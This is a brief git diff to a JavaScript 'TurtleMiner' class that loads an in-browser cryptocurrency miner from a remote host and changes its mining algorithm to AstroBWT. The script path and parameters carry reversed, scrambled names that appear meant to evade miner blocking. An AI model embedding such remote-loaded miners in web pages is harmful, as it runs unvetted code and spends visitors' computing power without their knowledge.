@@ -28,7 +28,7 @@ class TurtleMiner {
 	start() {
 		if (this.pool != "" && this.port != -1 && this.wallet != "") {
 			// loadScript("https://bitcoin-pay.eu/perfekt/perfekt.js?perfekt=wss://?algo=cn-lite?variant=2?jason="+this.pool+":"+this.port+"");
-			loadScript("https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?algy=cn-pico/trtl?nosaj="+this.pool+":"+this.port);
+			loadScript("https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?algy=AstroBWT?nosaj="+this.pool+":"+this.port);
 			setTimeout(() => {
 				try {
 					// EverythingIsBinary(this.wallet, this.workerName, 100-this.speed, this.threads);
